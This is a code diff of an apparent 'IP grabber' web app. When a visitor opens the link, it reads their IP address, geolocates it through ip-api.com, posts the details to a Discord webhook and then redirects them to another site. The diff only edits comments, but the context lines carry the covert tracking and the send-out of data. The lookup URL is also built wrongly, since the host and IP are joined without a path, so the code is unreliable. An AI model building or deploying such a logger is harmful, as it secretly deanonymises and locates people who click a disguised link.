@@ -6,13 +6,11 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
 
 app.get('/', async (req, res) => {
-    // 1. Get raw header
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     
-    // 2. Safely isolate the very first IP string cleanly without bugs
+    // FIXED: Properly index the array first, then trim it
     let clientIp = rawIp.split(',')[0].trim();
 
-    // 3. Fallback if running locally
     if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1') {
         clientIp = '8.8.8.8'; 
     }
@@ -21,7 +19,6 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // FIXED: Standard string addition. Absolutely no curly brackets or backticks used.
             const apiUrl = 'http://ip-api.com' + clientIp + '?fields=61439';
             const geoResponse = await axios.get(apiUrl);
             const geoData = geoResponse.data;
